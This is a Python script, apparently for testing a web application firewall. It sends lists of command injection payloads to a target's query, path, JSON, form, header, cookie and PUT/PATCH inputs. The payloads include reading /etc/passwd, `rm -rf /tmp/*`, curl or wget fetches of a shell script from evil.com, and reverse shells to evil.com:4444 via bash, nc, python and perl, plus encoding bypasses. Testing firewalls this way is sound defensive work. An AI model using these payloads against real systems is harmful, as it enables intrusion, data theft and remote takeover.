#!/usr/bin/env python3
"""
命令注入 (Command Injection) 攻击测试脚本

覆盖注入点:
  - GET Query / Path
  - POST JSON / Form / Raw
  - Header / Cookie
  - PUT / PATCH

Payload 来源: Linux/Windows 命令拼接、管道、重定向、反引号、$()、
              编码绕过、注释符、逻辑运算符等。
"""
import sys
import os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from test_base import WAFTestBase, parse_args, Colors


class CommandInjectionTester(WAFTestBase):
    ATTACK_NAME = "Command Injection"
    ATTACK_DESC = "命令注入攻击测试 — Linux/Windows 命令拼接、管道、重定向、编码绕过"

    GET_PAYLOADS = [
        # Linux 管道
        ("linux-pipe", "127.0.0.1 | whoami"),
        ("linux-pipe-cat", "127.0.0.1 | cat /etc/passwd"),
        ("linux-pipe-id", "127.0.0.1 | id"),
        ("linux-pipe-ls", "127.0.0.1 | ls -la"),
        ("linux-pipe-ps", "127.0.0.1 | ps aux"),
        ("linux-pipe-netstat", "127.0.0.1 | netstat -an"),
        ("linux-pipe-ifconfig", "127.0.0.1 | ifconfig"),
        ("linux-pipe-env", "127.0.0.1 | env"),
        ("linux-pipe-find", "127.0.0.1 | find / -name '*.conf'"),

        # 分号
        ("linux-semicolon", "127.0.0.1; whoami"),
        ("linux-semicolon-cat", "127.0.0.1; cat /etc/passwd"),
        ("linux-semicolon-id", "127.0.0.1; id"),
        ("linux-semicolon-ls", "127.0.0.1; ls -la"),
        ("linux-semicolon-rm", "127.0.0.1; rm -rf /tmp/*"),

        # 逻辑与
        ("linux-and", "127.0.0.1 && whoami"),
        ("linux-and-cat", "127.0.0.1 && cat /etc/passwd"),
        ("linux-and-id", "127.0.0.1 && id"),

        # 逻辑或
        ("linux-or", "127.0.0.1 || whoami"),
        ("linux-or-cat", "127.0.0.1 || cat /etc/passwd"),
        ("linux-or-id", "127.0.0.1 || id"),

        # 反引号
        ("linux-backtick", "127.0.0.1 `whoami`"),
        ("linux-backtick-cat", "127.0.0.1 `cat /etc/passwd`"),
        ("linux-backtick-id", "127.0.0.1 `id`"),
        ("linux-backtick-ls", "127.0.0.1 `ls`"),

        # $()
        ("linux-dollar-paren", "127.0.0.1 $(whoami)"),
        ("linux-dollar-paren-cat", "127.0.0.1 $(cat /etc/passwd)"),
        ("linux-dollar-paren-id", "127.0.0.1 $(id)"),
        ("linux-dollar-paren-ls", "127.0.0.1 $(ls -la)"),
        ("linux-dollar-paren-nested", "127.0.0.1 $(echo $(whoami))"),

        # 换行符
        ("linux-newline", "127.0.0.1\nwhoami"),
        ("linux-newline-cat", "127.0.0.1\ncat /etc/passwd"),
        ("linux-newline-id", "127.0.0.1\nid"),

        # 注释符
        ("linux-comment", "127.0.0.1 # whoami"),
        ("linux-comment-cat", "127.0.0.1 # cat /etc/passwd"),

        # 重定向
        ("linux-redirect-out", "127.0.0.1 > /tmp/output.txt"),
        ("linux-redirect-in", "127.0.0.1 < /etc/passwd"),
        ("linux-redirect-append", "127.0.0.1 >> /tmp/output.txt"),
        ("linux-redirect-pipe", "127.0.0.1 | tee /tmp/output.txt"),

        # 组合
        ("linux-combo-1", "127.0.0.1; whoami; id; uname -a"),
        ("linux-combo-2", "127.0.0.1 | whoami | id | uname -a"),
        ("linux-combo-3", "127.0.0.1 && whoami && id"),
        ("linux-combo-4", "127.0.0.1 || whoami || id"),
        ("linux-combo-5", "127.0.0.1; wget http://evil.com/shell.sh -O /tmp/shell.sh; sh /tmp/shell.sh"),
        ("linux-combo-6", "127.0.0.1; curl http://evil.com/shell.sh | sh"),
        ("linux-combo-7", "127.0.0.1; python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"evil.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"),
        ("linux-combo-8", "127.0.0.1; bash -i >& /dev/tcp/evil.com/4444 0>&1"),
        ("linux-combo-9", "127.0.0.1; nc -e /bin/sh evil.com 4444"),
        ("linux-combo-10", "127.0.0.1; perl -e 'use Socket;$i=\"evil.com\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">\u0026S\");open(STDOUT,\">\u0026S\");open(STDERR,\">\u0026S\");exec(\"/bin/sh -i\");};'"),

        # 编码绕过
        ("linux-enc-base64", "127.0.0.1; echo d2hvYW1p | base64 -d | sh"),
        ("linux-enc-hex", "127.0.0.1; echo 77686f616d69 | xxd -r -p | sh"),
        ("linux-enc-url", "127.0.0.1%3B%20whoami"),
        ("linux-enc-null", "127.0.0.1\x00; whoami"),

        # Windows 命令
        ("win-pipe", "127.0.0.1 | whoami"),
        ("win-ampersand", "127.0.0.1 & whoami"),
        ("win-ampersand-2", "127.0.0.1 && whoami"),
        ("win-or", "127.0.0.1 || whoami"),
        ("win-semicolon", "127.0.0.1 ; whoami"),
        ("win-cmd", "127.0.0.1 | cmd /c whoami"),
        ("win-powershell", "127.0.0.1 | powershell -Command whoami"),
        ("win-powershell-enc", "127.0.0.1 | powershell -EncodedCommand dwBoAG8AYQBtAGkA"),
        ("win-systeminfo", "127.0.0.1 | systeminfo"),
        ("win-net-user", "127.0.0.1 | net user"),
        ("win-dir", "127.0.0.1 | dir C:\\"),
        ("win-type", "127.0.0.1 | type C:\\windows\\win.ini"),
        ("win-combo", "127.0.0.1 & whoami & net user & systeminfo"),

        # 空字节 + 截断
        ("null-trunc", "127.0.0.1\x00|whoami"),
        ("null-trunc-2", "127.0.0.1%00|whoami"),

        # 其他 shell
        ("sh-backtick", "127.0.0.1 `sh -c whoami`"),
        ("sh-dollar", "127.0.0.1 $(sh -c whoami)"),
        ("sh-c", "127.0.0.1; sh -c 'whoami'"),
        ("sh-c-2", "127.0.0.1 | sh -c 'cat /etc/passwd'"),

        # 环境变量
        ("env-path", "127.0.0.1; echo $PATH"),
        ("env-home", "127.0.0.1; echo $HOME"),
        ("env-shell", "127.0.0.1; echo $SHELL"),
        ("env-user", "127.0.0.1; echo $USER"),

        # 时间盲注
        ("blind-sleep", "127.0.0.1; sleep 5"),
        ("blind-sleep-pipe", "127.0.0.1 | sleep 5"),
        ("blind-ping", "127.0.0.1; ping -c 5 127.0.0.1"),
    ]

    POST_PAYLOADS = [
        ("json-pipe", "127.0.0.1 | whoami"),
        ("json-semicolon", "127.0.0.1; cat /etc/passwd"),
        ("json-backtick", "127.0.0.1 `id`"),
        ("json-dollar", "127.0.0.1 $(whoami)"),
        ("json-newline", "127.0.0.1\nwhoami"),
        ("json-combo", "127.0.0.1; bash -i >& /dev/tcp/evil.com/4444 0>&1"),
        ("json-curl", "127.0.0.1; curl http://evil.com/shell.sh | sh"),
        ("json-nc", "127.0.0.1; nc -e /bin/sh evil.com 4444"),

        ("form-pipe", "127.0.0.1 | whoami"),
        ("form-semicolon", "127.0.0.1; id"),
        ("form-backtick", "127.0.0.1 `cat /etc/passwd`"),
        ("form-dollar", "127.0.0.1 $(uname -a)"),
        ("form-win", "127.0.0.1 | cmd /c whoami"),
    ]

    HEADER_PAYLOADS = [
        ("hdr-x-custom", "127.0.0.1 | whoami"),
        ("hdr-ua-cmd", "Mozilla/5.0; cat /etc/passwd"),
        ("hdr-referer-pipe", "http://evil.com | whoami"),
        ("hdr-xff-semicolon", "127.0.0.1; id"),
    ]

    COOKIE_PAYLOADS = [
        ("cookie-pipe", "127.0.0.1 | whoami"),
        ("cookie-semicolon", "127.0.0.1; cat /etc/passwd"),
        ("cookie-backtick", "127.0.0.1 `id`"),
    ]

    PATH_PAYLOADS = [
        ("path-pipe", "127.0.0.1|whoami"),
        ("path-semicolon", "127.0.0.1;whoami"),
        ("path-backtick", "127.0.0.1`whoami`"),
        ("path-dollar", "127.0.0.1$(whoami)"),
    ]

    def run(self):
        print(f"  {Colors.c('正在执行命令注入测试...', Colors.INFO)}\n")

        print(f"  {Colors.c('[注入点] GET Query', Colors.CYAN)}")
        for name, payload in self.GET_PAYLOADS:
            self.get_query(f"cmdi-get-{name}", payload, "/api/ping", "host")

        print(f"  {Colors.c('[注入点] GET Path', Colors.CYAN)}")
        for name, payload in self.PATH_PAYLOADS:
            self.get_path(f"cmdi-path-{name}", payload, "/api/run")

        print(f"  {Colors.c('[注入点] POST JSON', Colors.CYAN)}")
        for name, payload in self.POST_PAYLOADS[:5]:
            self.post_json(f"cmdi-json-{name}", payload, "/api/ping", "host")

        print(f"  {Colors.c('[注入点] POST Form', Colors.CYAN)}")
        for name, payload in self.POST_PAYLOADS[5:]:
            self.post_form(f"cmdi-form-{name}", payload, "/api/ping", "host")

        print(f"  {Colors.c('[注入点] Header', Colors.CYAN)}")
        headers = ["X-Custom-Header", "User-Agent", "Referer", "X-Forwarded-For"]
        for i, (name, payload) in enumerate(self.HEADER_PAYLOADS):
            h = headers[i % len(headers)]
            self.header_inject(f"cmdi-hdr-{name}", payload, h, "/api/echo")

        print(f"  {Colors.c('[注入点] Cookie', Colors.CYAN)}")
        for name, payload in self.COOKIE_PAYLOADS:
            self.cookie_inject(f"cmdi-cookie-{name}", payload, "/api/echo")

        print(f"  {Colors.c('[注入点] PUT / PATCH', Colors.CYAN)}")
        for name, payload in [("put-pipe", "127.0.0.1 | whoami"),
                               ("put-semicolon", "127.0.0.1; id"),
                               ("put-backtick", "127.0.0.1 `whoami`")]:
            self.put_json(f"cmdi-put-{name}", payload, "/api/config", "command")
            self.patch_json(f"cmdi-patch-{name}", payload, "/api/config", "command")


if __name__ == "__main__":
    args = parse_args("命令注入攻击测试")
    tester = CommandInjectionTester(
        target=args.target, domain=args.domain,
        verbose=args.verbose, timeout=args.timeout, delay=args.delay
    )
    tester.execute()
